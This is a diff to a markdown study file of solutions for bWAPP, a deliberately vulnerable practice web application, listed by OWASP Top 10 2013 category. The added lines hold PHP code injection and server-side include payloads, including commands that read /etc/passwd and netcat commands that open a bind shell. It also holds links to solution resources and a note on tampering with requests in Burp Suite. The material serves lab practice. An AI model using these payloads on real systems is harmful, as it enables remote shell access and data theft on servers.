@@ -1,5 +1,10 @@
 # bwapp解題(OWASP TOP 10[2013])
 
+https://github.com/skiptomyliu/solutions-bwapp
+
+https://wooly6bear.files.wordpress.com/2016/01/bwapp-tutorial.pdf
+
+
 # bwapp / A1 - Injection /
 
 [HTML Injection - Reflected (GET)](https://www.youtube.com/watch?v=q4SVMPGASIU)
@@ -23,7 +28,22 @@ OS Command Injection - Blind
 
 PHP Code Injection
 
+message=1; phpinfo()
+
+phpi.php?message=""; system('hostname')
+
+phpi.php?message=""; system('nc -lvp 1234 -e /bin/bash')
+
+
 Server-Side Includes (SSI) Injection
+
+<!--#exec cmd="id" -->
+
+<!--#exec cmd="cat /etc/passwd" -->
+
+connect to me on port 8888!
+
+<!--#exec cmd="nc -lvp 8888 -e /bin/bash" -->
 
 SQL Injection (GET/Search)
 
@@ -134,7 +154,11 @@ Cross-Site Scripting - Stored (User-Agent)
 
 [Insecure DOR (Change Secret)](https://www.youtube.com/watch?v=0cbSUq_LW3Y)
 ```
-Insecure DOR (Reset Secret)
+使用burpsuite竄改輸入資料
+```
+
+```
+[Insecure DOR (Reset Secret)}(https://www.youtube.com/watch?v=-B8Ajen2d1Y)
 
 Insecure DOR (Order Tickets)
 ```
